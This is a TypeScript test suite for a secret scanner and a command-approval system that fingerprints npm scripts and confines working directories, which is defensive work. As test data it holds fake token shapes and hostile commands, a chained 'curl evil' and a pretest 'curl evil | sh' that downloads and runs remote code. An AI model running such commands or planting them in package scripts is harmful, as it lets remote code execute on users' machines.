import * as assert from 'assert';
import { redact, scanSecrets } from '../../core/rules/secrets';
import { approvalFingerprint, detectPresets, normaliseRules, packageScriptOf, resolvedScripts, safeCwd } from '../../core/rules/validations';
import * as path from 'path';

describe('secret scanner (Pro)', () => {
  it('finds common token shapes in added lines and redacts them', () => {
    const lines = [
      { line: 3, text: 'AWS_KEY=AKIAIOSFODNN7EXAMPLE' },
      { line: 4, text: 'const gh = "ghp_abcdefghijklmnopqrstuvwxyz0123456789ABCD";' },
      { line: 5, text: '-----BEGIN RSA PRIVATE KEY-----' },
      { line: 6, text: 'password: "hunter2hunter2hunter2"' },
      { line: 7, text: 'const url = "postgres://user:s3cretpass@db.internal/x";' },
      { line: 8, text: 'api_key = "<your-api-key-here>"' }, // placeholder → ignored
      { line: 9, text: 'nothing to see' },
    ];
    const f = scanSecrets(lines);
    const ids = f.map((x) => x.patternId);
    assert.ok(ids.includes('github-token'));
    assert.ok(ids.includes('private-key'));
    assert.ok(ids.includes('generic-assignment'));
    assert.ok(ids.includes('url-credentials'));
    assert.ok(!f.some((x) => x.line === 8), 'placeholders are ignored');
    assert.ok(!f.some((x) => x.line === 9));
    for (const x of f) {
      assert.ok(!x.redacted.includes('ghp_abcdefghijklmnopqrstuvwxyz'), 'redacted');
      assert.ok(x.redacted.includes('chars)') || x.redacted === '****');
    }
    // AKIA…EXAMPLE contains "EXAMPLE" → treated as placeholder on purpose
    assert.ok(!ids.includes('aws-access-key'));
    assert.strictEqual(redact('short'), '****');
    assert.strictEqual(redact('ABCDEFGHIJKLMNOP'), 'ABCD…NOP (16 chars)');
  });
  it('one finding per line, skips very long lines, stays fast on pathological input', () => {
    const f = scanSecrets([{ line: 1, text: 'x'.repeat(5000) + ' ghp_' + 'a'.repeat(40) }]);
    assert.strictEqual(f.length, 0);
    const t0 = Date.now();
    scanSecrets(Array.from({ length: 300 }, (_, i) => ({ line: i, text: 'ab-'.repeat(330) })));
    assert.ok(Date.now() - t0 < 500, `pathological lines must not stall the host (${Date.now() - t0} ms)`);
    // labels: Anthropic before OpenAI; assignments without quotes / with prefixes; sk- slug is not a key
    const ids = (t: string) => scanSecrets([{ line: 1, text: t }]).map((x) => x.patternId);
    assert.deepStrictEqual(ids('KEY=sk-ant-' + 'a'.repeat(40)), ['anthropic-key']);
    assert.deepStrictEqual(ids('DB_PASSWORD=Sup3rS3cretValue123'), ['generic-assignment']);
    assert.deepStrictEqual(ids('"password": "Sup3rS3cretValue123"'), ['generic-assignment']);
    assert.deepStrictEqual(ids('const sk = "sk-my-super-long-variable-name-that-is-not-a-key";'), []);
  });
});

describe('validation rules (Pro)', () => {
  it('normalises settings and resolves package scripts', () => {
    const rules = normaliseRules([{ name: 'lint', command: 'npm run lint', runOn: 'afterReview', timeoutSec: 30 }, { command: '  npx tsc --noEmit ' }, { command: '' }, 'junk', { name: 'x', command: 'yarn test', runOn: 'weird', timeoutSec: -1 }]);
    assert.strictEqual(rules.length, 3);
    assert.deepStrictEqual(rules[0], { name: 'lint', command: 'npm run lint', cwd: undefined, runOn: 'afterReview', timeoutSec: 30 });
    assert.strictEqual(rules[1].name, 'npx tsc --noEmit');
    assert.strictEqual(rules[1].runOn, 'manual');
    assert.strictEqual(rules[1].timeoutSec, 600);
    assert.strictEqual(rules[2].runOn, 'manual');
    assert.strictEqual(packageScriptOf('npm run lint'), 'lint');
    assert.strictEqual(packageScriptOf('npm test'), 'test');
    assert.strictEqual(packageScriptOf('pnpm run build:prod'), 'build:prod');
    assert.strictEqual(packageScriptOf('yarn test'), 'test');
    assert.strictEqual(packageScriptOf('yarn add x'), undefined);
    assert.strictEqual(packageScriptOf('npx tsc --noEmit'), undefined);
  });
  it('approval fingerprint changes when the command, cwd, resolved script or folder change', () => {
    const r = normaliseRules([{ name: 'lint', command: 'npm run lint' }])[0];
    const a = approvalFingerprint(r, 'eslint src', 'folder1');
    assert.strictEqual(a, approvalFingerprint(r, 'eslint src', 'folder1'));
    assert.notStrictEqual(a, approvalFingerprint(r, 'eslint src && curl evil', 'folder1'), 'an agent editing package.json#scripts invalidates the approval');
    assert.notStrictEqual(a, approvalFingerprint(r, 'eslint src', 'folder2'));
    assert.notStrictEqual(a, approvalFingerprint({ ...r, cwd: 'packages/a' }, 'eslint src', 'folder1'));
    assert.notStrictEqual(a, approvalFingerprint({ ...r, command: 'npm run lint -- --fix' }, 'eslint src', 'folder1'));
    // trigger changes (manual → automatic) invalidate the approval too
    assert.notStrictEqual(a, approvalFingerprint({ ...r, runOn: 'afterReview' }, 'eslint src', 'folder1'));
    // pre/post scripts are part of what npm runs
    const base = resolvedScripts({ test: 'mocha' }, 'test');
    assert.strictEqual(base, JSON.stringify({ test: 'mocha' }));
    assert.notStrictEqual(base, resolvedScripts({ pretest: 'curl evil | sh', test: 'mocha' }, 'test'), 'an added pretest changes the resolved script');
    assert.strictEqual(resolvedScripts({}, 'test'), '<missing script test>');
    // cwd must stay inside the folder
    const inside = (b: string, p: string) => { const rel = path.relative(b, p); return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel)); };
    assert.strictEqual(safeCwd('/w', undefined, path.posix.join, inside), '/w');
    assert.strictEqual(safeCwd('/w', 'packages/a', path.posix.join, inside), '/w/packages/a');
    assert.strictEqual(safeCwd('/w', '../..', path.posix.join, inside), undefined);
    assert.strictEqual(safeCwd('/w', 'a/../../x', path.posix.join, inside), undefined);
  });
  it('detects presets from project files', () => {
    const p = detectPresets({ packageJson: { scripts: { lint: 'eslint .', test: 'mocha', build: 'tsc' } }, files: ['tsconfig.json', 'go.mod'] });
    const names = p.map((x) => x.name);
    assert.deepStrictEqual(names, ['lint', 'test', 'build', 'tsc', 'go vet']);
    assert.strictEqual(p[0].command, 'npm run lint');
    assert.deepStrictEqual(detectPresets({ files: [] }), []);
  });
});
